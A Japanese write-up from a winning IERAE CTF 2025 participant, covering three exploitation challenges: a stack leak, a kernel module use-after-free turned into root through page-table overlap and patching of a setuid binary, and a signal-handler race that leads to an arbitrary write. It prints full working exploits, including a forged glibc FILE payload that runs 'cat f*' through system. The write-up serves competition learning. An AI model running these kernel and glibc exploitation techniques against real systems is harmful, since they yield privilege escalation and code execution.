---
layout: page
title: IERAE CTF 2025
parent: CTF Writeups
nav_order: 10
---

IERAE CTF 2025 に参加してきた。優勝です。嬉しい。

さて、私が解いた問題は

- Stdio Studio
- vibexec
- The World

の３つ。The World は競技中に解けなかったが、upsolve したので紹介する。

# Stdio Studio

ユーザランドで次のようなコードが動いている。

```c
// gcc chal.c -o chal -O3

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void load_flag() {
  char flag[128] = "";

  FILE *fp = fopen("flag.txt", "rb");
  if (!fp) {
    puts("Something went wrong. Call admin.");
    exit(1);
  }

  fread(flag, sizeof(char), 128, fp);
  fclose(fp);

  // puts(flag); // Sorry! No flag for you!
  memset(flag, 0, 128); // The secret should be cleared up
}

void echo(void) {
  unsigned int size;
  char *buf;

  printf("Size: ");
  scanf("%u%*c", &size);

  buf = alloca(size);
  if (!buf) {
    puts("Too large!");
    exit(1);
  }

  printf("Input: ");
  fgets(buf, size, stdin);

  sleep(1);

  printf("Output: %s\n", buf);
}

int main() {
  setbuf(stdout, NULL);

  puts("1. Load flag");
  puts("2. Echo");

  while (1) {
    int cmd;

    printf("Enter command: ");

    scanf("%d%*c", &cmd);

    if (cmd == 1) load_flag();
    else if (cmd == 2) echo();
    else {
      puts("Invalid command :(");
      return 0;
    }
  }
}
```

冒頭のコメントにもある通り、`-O3` でコンパイルされている。`load_flag`の`memset`は最適化で消えるため、`echo`にて`size`を調節することで`flag`を格納していた領域までずらすことができる。

あとは`fgets`を`Ctrl-D`等で失敗させることでフラグが出力される。

```
1
2
80
<Ctrl-D>
```

# vibexec

次のようなカーネルモジュールが差し込まれる。

```c
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define DEVICE_NAME "vibexec"
#define CACHE_NAME "vibexec_cache"

#define IOCTL_ADD_ITEM 0xabcd0001
#define IOCTL_REMOVE_ITEM 0xabcd0002
#define IOCTL_SKIP 0xabcd0003
#define IOCTL_EDIT_MEMO 0xabcd0004

struct list_item {
  long key;
  struct list_head list;
  char memo[0x28];
};

struct req_item {
  long key;
  char memo[0x28];
};

static struct kmem_cache *item_cache;

static LIST_HEAD(g_head);
static DEFINE_MUTEX(g_mutex);

static int skip_item(long key) {
  struct list_item *cur, *next, *prev;
  struct list_head *pos, *temp;

  if (list_empty(&g_head))
    return 0;

  list_for_each_safe(pos, temp, &g_head) {
    if (pos->prev == &g_head)
      continue;
    if (pos->next == &g_head)
      break;

    cur = list_entry(pos, struct list_item, list);
    prev = list_entry(pos->prev, struct list_item, list);
    next = list_entry(pos->next, struct list_item, list);

    if (cur->key == key) {
      prev->list.next = cur->list.next;
      next->list.next = prev->list.next;

      next->list.prev = cur->list.prev;
      prev->list.prev = cur->list.prev;

      kmem_cache_free(item_cache, pos);
      return 0;
    }
  }

  return -EINVAL;
}

static int add_item(long key) {
  struct list_item *new_item;

  new_item = kmem_cache_alloc(item_cache, GFP_KERNEL);
  if (!new_item) {
    return -ENOMEM;
  }

  new_item->key = key;
  list_add_tail(&new_item->list, &g_head);

  return 0;
}

static int remove_item(long key) {
  struct list_item *item, *temp;

  list_for_each_entry_safe(item, temp, &g_head, list) {
    if (item->key == key) {
      list_del(&item->list);
      kmem_cache_free(item_cache, item);
      return 0;
    }
  }

  return -EINVAL;
}

static int edit_memo(struct req_item *req) {
  struct list_item *item;

  list_for_each_entry(item, &g_head, list) {
    if (item->key == req->key) {
      memcpy(&item->memo, &req->memo, sizeof(((struct list_item *)0)->memo));
      return 0;
    }
  }

  return -EINVAL;
}

static long device_ioctl(struct file *file, unsigned int cmd,
                         unsigned long arg) {
  long val;
  int ret = 0;
  struct req_item req;

  mutex_lock(&g_mutex);

  switch (cmd) {
  case IOCTL_ADD_ITEM:
    if (copy_from_user(&val, (long *)arg, sizeof(long))) {
      ret = -EFAULT;
      goto end;
    }
    ret = add_item(val);
    break;

  case IOCTL_REMOVE_ITEM:
    if (copy_from_user(&val, (long *)arg, sizeof(long))) {
      ret = -EFAULT;
      goto end;
    }
    ret = remove_item(val);
    break;
  case IOCTL_SKIP:
    if (copy_from_user(&val, (long *)arg, sizeof(long))) {
      ret = -EFAULT;
      goto end;
    }
    ret = skip_item(val);
    break;
  case IOCTL_EDIT_MEMO:
    if (copy_from_user(&req, (void *)arg, sizeof(struct req_item))) {
      ret = -EFAULT;
      goto end;
    }
    ret = edit_memo(&req);
    break;
  default:
    ret = -EINVAL;
  }
end:
  mutex_unlock(&g_mutex);

  return ret;
}

// --- initialization -- //
static struct file_operations chal_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = device_ioctl,
};
static struct miscdevice chal_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = DEVICE_NAME,
    .fops = &chal_fops,
};

static int __init module_initialize(void) {
  if (misc_register(&chal_device)) {
    pr_warn("Failed to register\n");
    return -EBUSY;
  }
  item_cache = kmem_cache_create(CACHE_NAME, sizeof(struct list_item), 0,
                                 SLAB_HWCACHE_ALIGN, NULL);
  if (!item_cache) {
    pr_warn("Failed to create slab cache\n");
    return -ENOMEM;
  }
  INIT_LIST_HEAD(&g_head);
  return 0;
}

module_init(module_initialize);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LLM and Rona");
MODULE_DESCRIPTION("vibexec - Kernel module for IERAE CTF 2025");
```

`skip_item`に自明な脆弱性がある。まず次のようなチェインを考えよう。

![vibexec_1](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/vibexec/vibexec_1.png)

この時、`B`をスキップすると、次のようなチェインへ変化する。

![vibexec_2](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/vibexec/vibexec_2.png)

明らかにバグっている。ここで更に`C`をスキップするとどうなろうだろうか。

![vibexec_3](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/vibexec/vibexec_3.png)

`next`が自分を向いているので`A`がフリーしたはずの`C`を指し続けることになる。これは UAF write となる。

このノード達は専用の`slab`から取られているためクロスキャッシュが難しい。dirty pagetable で root を取ろう。

`slab`のすべての要素が開放されても、すぐに buddy に返されるわけではない。最適化のため、からの`slab`を保持し続けてしまう。今回は開放したページを PTE に重ねたいので、nr partial 以上のスラブを開放することで buddy へ返す。その際、開放する順序に注意する。

nr partial の値は、`/sys/kernel/slab`内で確認することができるが、現実的にはそう多くないため、後掲する exploit では横着をして適当な数を開放している。

さて、UAF できるページが buddy に返され、その後`mmap`を繰り返すことで PTE を確保し、無事オーバーラップが発生したとしよう。

CONFIG_SLAB_FREELIST_RANDOM が有効なため、`kmem_cache_alloc`で確保されるノードの、`slab`内のオフセットはランダムである。
PTE を重ねても、どのエントリを破壊できたかわからない。

TLB flush を試してみたがなぜかうまく行かなかったため、次のような方法を用いた。

1. `mmap`を行い、`0xdeadbeef`を書き込む
2. UAF でどこかのエントリを改ざんする。
3. 物理アドレスが改ざんされていれば、書き込んだ値以外のデータが読み出せるはずである。

また、PTE はすべて 0 で処理化されるため、書き込む際の`key`は`0`とすれば良い。そのため、他の領域を`add`する際の`key`は`0`以外にしなければならない。

`mmap`する際、アドレスの小さい方から改ざんを始めると、先に`key`を破壊してしまい、改ざん対象を検索できなくなってしまうため、後ろから PTE を埋めるように確保する。また、`memo`は 0x28 バイトあるため、改ざんが成功したタイミングの`pmd`や`pte`のインデックスを少し調節してやる必要がある（`pte -= 4`）。

その後は `setuid` の実行バイナリが格納されている物理アドレスを 256 通り探索し、適当な条件分岐を成功させるコードを埋め込むと root 権限を奪取することができる。

最終的な exploit は次の通り。

```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <kpwn/logger.h>
#include <kpwn/prelude.h>
#include <kpwn/slog.h>
#include <kpwn/x86_64/memory.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>

int fd = 0;

struct req_item {
  long key;
  char memo[0x28];
};

#define IOCTL_ADD_ITEM 0xabcd0001
#define IOCTL_REMOVE_ITEM 0xabcd0002
#define IOCTL_SKIP 0xabcd0003
#define IOCTL_EDIT_MEMO 0xabcd0004

int add(long val) { return SYSCHK(ioctl(fd, IOCTL_ADD_ITEM, &val)); }

int del(long val) { return SYSCHK(ioctl(fd, IOCTL_REMOVE_ITEM, &val)); }

int skip(long val) { return SYSCHK(ioctl(fd, IOCTL_SKIP, &val)); }

int edit(struct req_item *req) {
  return SYSCHK(ioctl(fd, IOCTL_EDIT_MEMO, req));
}

int edit_kv(long key, uint64_t value) {
  struct req_item item = {.key = key};
  up64(value, item.memo);

  return edit(&item);
}

int main(int argc, char **argv) {
  noaslr(argc, argv);

  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  setbuf(stdin, NULL);

  log_level = LOG_INFO;

  log_info("start pwning");

  dmmap(NULL, MAPDEF); // vm_area_struct

  fd = SYSCHK(open("/dev/vibexec", O_RDWR));
  log_info("opened challenge");

  REP2(cache_idx, 64) {
    REP2(i, 64) { add(cache_idx << 8 | i | 0xffff000000000000); }
  }

  log_info("filled");

  for (int cache_idx = 64 - 1; 32 <= cache_idx; cache_idx--) {
    for (int idx = 64 - 1; 0 <= idx; idx--) {
      del(cache_idx << 8 | idx | 0xffff000000000000);
    }
  }

  for (int idx = 64 - 1; 2 <= idx; idx--) {
    del(31 << 8 | idx | 0xffff000000000000);
  }

  skip(31 << 8 | 0 | 0xffff000000000000);
  skip(31 << 8 | 1 | 0xffff000000000000);
  log_info("created broken list at freed slab");

  for (int cache_idx = 31 - 1; 16 <= cache_idx; cache_idx--) {
    for (int idx = 64 - 1; 0 <= idx; idx--) {
      del(cache_idx << 8 | idx | 0xffff000000000000);
    }
  }

  log_info("filled cpu partial");

  // alloc pte
  for (int i = 0; i < 100; i++) {
    uint64_t *p = SYSCHK(pti_mmap(log_null, 0, 1, i, 0, MAPDEF));
    *p = 0x1234; // touch page
  }

  int pmd, pte;
  for (pmd = 0; pmd < 0x200; pmd++) {
    log_info("pmd = %x", pmd);

    for (pte = 0x200 - 1; 0 <= pte; pte--) {
      pgaddr addr = from_pti(0, 1, pmd, pte, 0);
      uint64_t *volatile p = SYSCHK(lgmmap(log_null, addr.ptr, MAPDEF));
      *p = 0xdeadbeef;

      edit_kv(0, phy_to_pte(0x0a58b6)); // maybe rewrite pte table

      if (*p != 0xdeadbeef) // overwrite!
        goto found;

      SYSCHK(lgmunmap(log_null, addr.ptr, 0x1000));
    }
  }

  DIE("bad luck");

found:;

  char search[0x10];
  snprintf(search, 0x10, "%lx", (uint64_t)from_pti(0, 1, pmd, pte, 0).ptr);

  log_succ("found! pmd = %x, pte = %x, address = %s", pmd, pte, search);

  int maps = SYSCHK(open("/proc/self/maps", O_RDONLY));
  char line[0x100];
  for (int pos = 0; read(maps, &line[pos], 1); pos++) {
    if (line[pos] == '\n') {
      if (strstr(line, search) != 0) {
        log_succ("found victim entry from /proc/self/maps");
        log_succ("%.*s", pos, line);
        break;
      }
      pos = -1;
    }
  }
  close(maps);

  pte -= 4;
  // sizeof(memo) = 0x28

  uint64_t dest = 0x0a58b6;
  uint64_t offset = dest & 0xfff;
  unsigned char *addr = from_pti(0, 1, pmd, pte, offset).ptr;

  REP1(0x100) {
    edit_kv(0, phy_to_pte(dest));

    if ((addr[0] == 0x84) && (addr[1] == 0xc0)) {
      // 0x84, 0xc0: test al, al

      hexdump(log_info, addr, 0x80);

      log_succ("found target instructions!");
      addr[1] = 0xd2;
      // 0b11 010 010: register, low, dl
      // 0x84, 0xd2: test dl, dl

      goto found_setuid;
    }

    dest += 0x100000; // go to next address
  }

  DIE("bad luck 2");

found_setuid:

  setuid(0);
  if (getuid() == 0) {
    log_succ("you got real world");
    log_succ("have fun~");

    system("cat /flag");
    system("id");

    win();
  } else {
    log_erro("something is wrong...");
  }
  interactive();
}
```

![vibexec_solve](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/vibexec/vibexec_solve.png)

# The World

次のようなコードが動いている。

```c
//  gcc chal.c -o chal -lpthread -lcrypto -lssl

#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <errno.h>
#include <stdint.h>
#include <sys/param.h>
#include <openssl/sha.h>

#define NUM_MINERS 3

struct mining {
  union {
    unsigned char *result;
    long long int hash;
  } data;
  int hash_len;
  char *prefix;
  int prefix_len;
};

enum Status {
  NEVER_STARTED = 0,
  RUNNING,
  RESULT_READY,
  BUFFER_READY,
  FINISHED,
};

pthread_mutex_t mutex;
atomic_char status[NUM_MINERS];
struct mining miners[NUM_MINERS];
int notify_fd[NUM_MINERS][2];

void handler(int) {
  for (int i=0; i<NUM_MINERS; i++) {
    close(notify_fd[i][0]);
    close(notify_fd[i][1]);
  }

  puts("Timed out");
  exit(0);
}

void* miner_thread(void* arg) {
  char alloced[7] = "";
  int idx = (int)arg;

  while (1) {
    while (1) {
      pthread_mutex_lock(&mutex);
      int stat = atomic_load(&status[idx]);
      pthread_mutex_unlock(&mutex);

      if (stat == RUNNING) break;
      usleep(1000);
    }

    int prefix_len = miners[idx].prefix_len;
    int result_len = prefix_len + 8;
    char *candidate = malloc(result_len);
    if (!candidate) {
      puts("End");
      exit(1);
    }

    memcpy(candidate, miners[idx].prefix, prefix_len);

    uint64_t suffix=0;
    while (1) {
      unsigned char hash[64] = "";

      for (int i=0; i<8; i++) {
        candidate[prefix_len+i] = (suffix >> (i*8)) & 0xff;
      }

      SHA256_CTX sha256;
      SHA256_Init(&sha256);
      SHA256_Update(&sha256, candidate, result_len);
      SHA256_Final(hash, &sha256);

      if (memcmp(hash, &miners[idx].data.hash, miners[idx].hash_len) == 0) {
        break;
      }

      if (suffix+1 < suffix) break;
      ++suffix;
    }

    pthread_mutex_lock(&mutex);
    atomic_store(&status[idx], RESULT_READY);
    pthread_mutex_unlock(&mutex);

    read(notify_fd[idx][0], alloced, 7);
    assert(memcmp(alloced, "ALLOCED", 7) == 0);

    sleep(1);

    pthread_mutex_lock(&mutex);
    atomic_store(&status[idx], FINISHED);
    memcpy(miners[idx].data.result, candidate, result_len);
    pthread_mutex_unlock(&mutex);

    free(candidate);
  }

  return NULL;
}

void start_mining(void) {
  int idx = -1;
  int hash_len = -1;
  int prefix_len = -1;
  char *prefix;

  printf("Miner idx: ");
  scanf("%d", &idx);
  if (idx < 0 || NUM_MINERS <= idx) {
    puts("Invalid index");
    return;
  }

  pthread_mutex_lock(&mutex);
  char stat = atomic_load(&status[idx]);
  pthread_mutex_unlock(&mutex);
  if (stat == RUNNING || stat == RESULT_READY || stat == BUFFER_READY) {
    puts("It's used");
    return;
  }

  printf("Length of hash: ");
  scanf("%d", &hash_len);

  if (hash_len < 0 || 8 < hash_len) {
    puts("Invalid length");
    return;
  }

  long long int hash;
  printf("Hash: ");
  scanf("%lld", &hash);

  printf("Length of prefix: ");
  scanf("%d", &prefix_len);
  if (prefix_len < 0 || 0x1000000 < prefix_len) {
    puts("Too large");
    return;
  }

  prefix = malloc(prefix_len+1);
  if (!prefix) {
    puts("End");
    exit(1);
  }

  for (int i=0; i<prefix_len+1; i++) {
    prefix[i] = 0;
  }

  printf("Prefix: ");
  getchar(); // consume newline
  fgets(prefix, prefix_len+1, stdin);

  pthread_mutex_lock(&mutex);
  stat = atomic_load(&status[idx]);
  pthread_mutex_unlock(&mutex);

  if (stat == FINISHED && miners[idx].data.result) {
    free(miners[idx].data.result);
    miners[idx].data.result = NULL;
  }

  miners[idx].hash_len = hash_len;
  miners[idx].data.hash = hash;

  miners[idx].prefix_len = prefix_len;

  if (miners[idx].prefix) free(miners[idx].prefix);
  miners[idx].prefix = prefix;

  pthread_mutex_lock(&mutex);
  atomic_store(&status[idx], RUNNING);
  pthread_mutex_unlock(&mutex);
}

void show_results(void) {
  for (int idx=0; idx<NUM_MINERS; idx++) {
    pthread_mutex_lock(&mutex);
    char stat = atomic_load(&status[idx]);
    pthread_mutex_unlock(&mutex);

    if (stat != RESULT_READY) continue;

    pthread_mutex_lock(&mutex);
    miners[idx].data.result = malloc(miners[idx].prefix_len + 8);
    if (!miners[idx].data.result) {
      puts("End");
      exit(1);
    }
    atomic_store(&status[idx], BUFFER_READY);
    pthread_mutex_unlock(&mutex);

    write(notify_fd[idx][1], "ALLOCED", 7);
  }

  for (int idx=0; idx<NUM_MINERS; idx++) {
    pthread_mutex_lock(&mutex);
    int stat = atomic_load(&status[idx]);
    pthread_mutex_unlock(&mutex);

    if (stat == RUNNING) {
      printf("\n#%d - RUNNING\n", idx);
      printf("Hash: %llx\n", miners[idx].data.hash);
    } else if (stat == RESULT_READY) {
      printf("\n#%d - RESULT READY\n", idx);
    } else if (stat == BUFFER_READY) {
      printf("\n#%d - BUFFER READY\n", idx);
    } else if (stat == FINISHED) {
      printf("\n#%d - FINISHED\n", idx);
      printf("Result: ");
      int result_len = miners[idx].prefix_len + 8;
      for (int i=0; i<result_len; i++) {
        printf("%02X", miners[idx].data.result[i]);
      }
      puts("");
    } else if (stat == NEVER_STARTED) {
      printf("\n#%d - UNUSED\n", idx);
    } else {
      puts("End");
      exit(1);
    }
  }
  puts("");
}

int main() {
  pthread_t miner_threads[NUM_MINERS];

  setbuf(stdout, NULL);
  pthread_mutex_init(&mutex, NULL);

  for (int i = 0; i < NUM_MINERS; i++) {
    if (pipe(notify_fd[i]) == -1) {
      puts("End");
      return 0;
    }
    pthread_create(&miner_threads[i], NULL, miner_thread, (void*)i);
  }

  signal(SIGALRM, handler);
  alarm(60);

  while (1) {
    puts("1. Start new mining");
    puts("2. Show results");
    puts("3. Exit");
    printf("Enter command: ");

    int cmd;
    scanf("%d", &cmd);
    if (cmd == 3) break;

    switch (cmd) {
    case 1:
      start_mining();
      break;
    case 2:
      show_results();
      break;
    }
  }

  return 0;
}
```

まず目に入ったのが、シグナルハンドラー内で`puts`をしている部分である。シグナルハンドラ内で呼ぶことのできる関数に制約があるというのは有名な話だ（`man 7 signal-safety`）。頭の片隅においておこう。

さて、状態遷移の脆弱性はない。怪しい部分として、ユーザ入力の`hash`と、結果を格納するポインタ`result`が`union`で重ねられているところである。

一種のメタ読みだが、ここを利用することで exploitable になっている問題だと仮定すると、次の部分を利用するのだろう。

```c
memcpy(miners[idx].data.result, candidate, result_len);
```

ここに入るためには、次の条件を突破する必要がある。

```c
read(notify_fd[idx][0], alloced, 7);
assert(memcmp(alloced, "ALLOCED", 7) == 0);
```

メインスレッドでメモリを確保し、その後`write`している。
しかし、状態の管理を司っている`status`は`atomic_store`を用いて操作されており、メモリオーダリングは Sequentially-Consistent となっているため、`result`への書き込みと`status`の間に先行発生関係が結ばれている。したがって`result`は必ず`malloc`されたアドレスになっているため脆弱ではない。別の方法を探す。

もう一度コードを睨むと、`alloced`がクリアされておらず、また`read`のエラーハンドリングが行われていない。つまり、`read`が失敗した場合、`alloced`にもともと`"ALLOCED"`が入っていれば`hash`へ書き込みが行われるはずである。そのため、`handler`内の`close`を使い、この脆弱性を悪用しよう。

さて、`handler`は、

```c
signal(SIGALRM, handler);
alarm(60);
```

で設定され、1 分後に`handler`が呼び出される。実装は、

```c
void handler(int) {
  for (int i=0; i<NUM_MINERS; i++) {
    close(notify_fd[i][0]);
    close(notify_fd[i][1]);
  }

  puts("Timed out");
  exit(0);
}
```

である。`exit`ですぐに終了してしまうが、`puts`で実行を止めることができれば、`sleep(1)`を超え任意アドレス書き込みが達成できる。

`stdout`のバッファリングが無効になっているため、出力文字列はそのまま`write`システムコールに渡される。また、TCP で繋がっている相手に対する`write`システムコールは、指定された文字列をすべて書き込むまで実行を停止する。

したがって、他の部分で大量の出力を行いクライアント側でそれを受け取らないことでリモートの TCP バッファを埋めると、`handler`内の`puts`で実行が止まる。この状態を 1 秒以上維持すれば`sleep`を超えることができる。

実験でこれを確かめよう。リモートに接続し、ひたすら`show`を行ってみる。

```py
from pwn import *

io = remote("34.85.42.235", 33337)
for _ in range(100000):
    io.sendline(b"2")

input()
```

`input`て停止中に、ローカルの TCP バッファを確認する。

```bash
$ ss
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port
tcp ESTAB 91583 73136 192.168.1.8:37550 34.85.42.235:33337
```

`Recv-Q`、`Send-Q`ともに大きな値となっている。これは、ローカルの`Recv-Q`が埋まり、リモートの`Send-Q`が埋まったため、出力で止まってしまい、次にリモートの`Recv-Q`、そして最後にローカルの`Send-Q`が溜まってしまったのだと推測される。

状況を整理しよう。

- プログラムは開始から１分後に`handler`を呼び出すが、あらかじめ TCP のバッファを埋めておくことにより、`puts`で実行と止めることができる。
- その直前の`close`によって、pthread 内の`read`が失敗し、あらかじめ`alloced`に`"ALLOCED"`を書き込んで置けば、`result`と`hash`は union で重なっているため、`hash`の値へ書き込みが行われる。
- `hash`はユーザが自由に設定できる値であるため、これにより`AAW`が実現する。

それ以外にも、`scanf`を失敗させることで`hash`に未初期化の値をいれることが可能であり、ここにはちょうど libc の値が載っているため、アドレスのリークが可能。これを使って`stderr`等に任意書き込みを行い、House of Cat でフラグを読み出す。その際、出力を stdout に向けるとバッファが詰まっていてフラグが送信されないため、stderr に向ける必要がある（実際の競技ではここで詰まっていたため、些細だが非常に重要なことである）。

最終的な exploit を以下に示す。

```py
from typing import List, Any, Dict
import time
import socket
from pwn import *
from libpwncof import PayloadBuffer, LabelRef, create_ucontext

"""
def c_sendlineafter(
    self, delim: bytes, data: bytes, wait=True, *args: Any, **kwargs: Any
) -> None:
    # conditional sendlineafter
    if wait:
        self.sendlineafter(delim, data)
    else:
        self.sendline(data)
"""

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
context.log_level = "info"

path = "./chal_patched"
elf = ELF(path)
context.binary = elf

libc = ELF("./libs/libc.so.6")

# io: tube = process(path)
# io: tube = remote("127.0.0.1", 33337, buffer_fill_size=1024)
io: tube = remote("34.85.42.235", 33337, buffer_fill_size=1024)

io.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)


def new_mine(
    idx: int, hlen: int, hash: int | None, prefix_len: int, prefix: bytes, wait=True
):
    io.c_sendlineafter(b"command: ", b"1", wait)
    io.c_sendlineafter(b"Miner idx: ", str(idx).encode(), wait)
    io.c_sendlineafter(b"hash: ", str(hlen).encode(), wait)

    if hash is None:
        io.c_sendlineafter(b"Hash: ", b"+", wait)
    else:
        io.c_sendlineafter(b"Hash: ", str(hash).encode(), wait)

    io.c_sendlineafter(b"Length of prefix: ", str(prefix_len).encode(), wait)
    io.c_sendlineafter(b"Prefix: ", prefix, wait)


def cmd(v, wait=True):
    io.c_sendlineafter(b"command: ", str(v).encode(), wait)


new_mine(2, 8, None, 0, b"")

cmd(2)
libc_base = int(
    io.recvregex(b"Hash: ([0-9a-f]*)\n", capture=True).group(1).decode(), 16
)
libc_base -= 0x87DDA

assert libc_base & 0xFFF == 0, "libc is not aliged"
io.success(f"got libc base {hex(libc_base)}")
libc.address = libc_base

new_mine(0, 0, 0, 0, b"")
new_mine(1, 0, 0, 0, b"")
cmd(2)
time.sleep(2)

off = 0xB0

payload = p32(0xFBAD0101) + b";cat f*>&2\0"  # fp->_flags & _IO_UNBUFFERED == 0)
payload += b"\x00" * (0x58 - len(payload))
payload += p64(libc.symbols["system"])  # vtable->iowalloc
payload += b"\x00" * (0x88 - len(payload))
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)  # lock (1)
payload += b"\x00" * (0xA0 - len(payload))
payload += p64(libc.symbols["_IO_2_1_stderr_"] + 0x100 - off)  # _wide_data (1)
payload += b"\x00" * (0xC0 - len(payload))
payload += p32(1)  # fp->_mode != 0
payload += b"\x00" * (0xD8 - len(payload))
payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)  # _IO_wfile_jumps + delta
payload += b"\x00" * (0x100 - len(payload))

payload += b"\x00" * (0xE0 - off)
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)  # (1) _wide_data->vtable

new_mine(0, 2, libc.symbols["_IO_2_1_stderr_"], len(payload) + 0x10, payload, wait=True)

for _ in range(0x20000):
    cmd(2, wait=False)

log.info("waiting for timeout")
time.sleep(70)

got = io.recvall()

with open("./out.txt", "wb") as f:
    f.write(got)

log.info("wrote to ./out.txt")
log.success("check output file to get the flag")
```

安定はしないが、何回か実行すると、`out.txt`の末尾にフラグが書き込まれるはず。

ちなみに、競技中に詰まった要因の一つとして、GDB でアタッチしていると`handler`へ移るスレッドに差異が生まれ、その影響で stdout のロックが本来とは別の挙動を示す。安易なアタッチには気をつけよう。

# 感想

kernel の練習をちょこちょこしてたので、スムーズに exploit して first blood が取れたので安心。

また、signal safety に関する作問アイデアがあったのだが、The World で先を越されてしまい、何なら競技中に解けなかったので結構悔しい。ただ脆弱性の発見はスムーズだったのを成長の証ということにして、悔しさは今後の糧としよう。

全体的に問題の質が非常に高く、解いていて楽しかった。運営の皆さんお疲れ様でした。面白い問題をありがとうございます！
